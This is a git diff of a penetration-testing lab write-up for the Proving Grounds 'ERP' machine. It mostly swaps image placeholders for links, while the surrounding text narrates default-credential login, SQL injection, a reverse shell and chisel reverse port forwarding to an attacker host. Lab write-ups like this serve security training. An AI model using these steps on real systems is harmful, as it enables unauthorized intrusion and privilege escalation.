@@ -25,7 +25,13 @@ PORT   STATE SERVICE VERSION
 
 Trying to log in using common credentials and SQL injection, but unable to gain access.
 
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230303_224723_001.png)
+
 Continuing our search of the web directory, we find a robots.txt file that provides an additional link to `/weberp/index.php`.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_131417_002.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_131539_003.png)
 
 We are able to log in successfully using the credentials we found on Google.
 
@@ -33,20 +39,20 @@ We are able to log in successfully using the credentials we found on Google.
 admin///weberp
 ```
 
-![4]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_133108_004.png)
 
-Please note that logging into this ERP system may be a bit slow.
+Note that logging into this ERP system may be a bit slow.
 
-![5]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_133245_005.png)
 
 Once we log in, we can verify that the system version is 4.15 and identify a related vulnerability.
 
-![6]
-![7]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_134134_006.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_134251_007.png)
 
-We test the vulnerability and confirm that the PoC codes works properly. Please note that both the `path` and `order` parameters must be entered correctly. It took me a lot of time to test.
+We test the vulnerability and confirm that the PoC codes works properly. Note that both the `path` and `order` parameters must be entered correctly. It took me a lot of time to test.
 
-![8]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_134725_008_.png)
 
 Although this PoC codes is only for blind SQL injection testing, we can modify it to retrieve the data, just like in sqlmap. I refer to other SQL injection testing codes and modify our PoC codes accordingly. The results are as follows:
 
@@ -160,7 +166,7 @@ if __name__ == "__main__":
                 #print "Verify input data and try again"
 ```
 
-![9]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_151210_009.png)
 
 As you can see, we have found another database named `inoerp_db`. Although we could try to modify the code to continue retrieving tables and more information, but it would take a lot of time. So, let's try googling the database name and see what we can find.
 
@@ -170,25 +176,25 @@ Now that we know it is another ERP system, perhaps it has been installed on our 
 http://192.168.188.227/inoerp/
 ```
 
-![10]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_151221_010.png)
 
-![11]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_151425_011.png)
 
 Although the vulnerability version is not applicable, we can still attempt to use it and see what happens.
 
-![12]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_151641_012.png)
 
 We have obtained a reverse shell.
 
-![13]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_152542_013.png)
 
-![14]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_152612_014.png)
 
 #### Privilege Escalation
 
 We have found an active port 8443 that was not visible during the initial nmap scan.
 
-![15]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_153429_015.png)
 
 Use `chisel` to forward the service.
 
@@ -198,7 +204,7 @@ Use port 80 on our host to listen to the forwarding.
 ./chisel server -p 80 --reverse -v
 ```
 
-![16]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_160123_016.png)
 
 Execute the following command on the target host.
 
@@ -207,23 +213,27 @@ Execute the following command on the target host.
 ./chisel client 192.168.45.5:80 R:5678:localhost:8443
 ```
 
-![17]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_160224_017.png)
 
 The service has been successfully forwarded.
 
-![18]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_160310_018.png)
 
 Confirmed that an HTTP service is running on port 8443 on the target host via nmap scan.
 
-![19]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_161138_019.png)
 
-![20]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_162058_020.png)
 
 This service has an unauthenticated RCE vulnerability and is running with root privilege.
 
-![21]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_162551_021.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_164006_022.png)
 
 Since port 80 is already being used for listening and forwarding, we will choose another active port from the list for reverse shell listening.
 
-![]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_164210_023.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230304_164236_024.png)
 
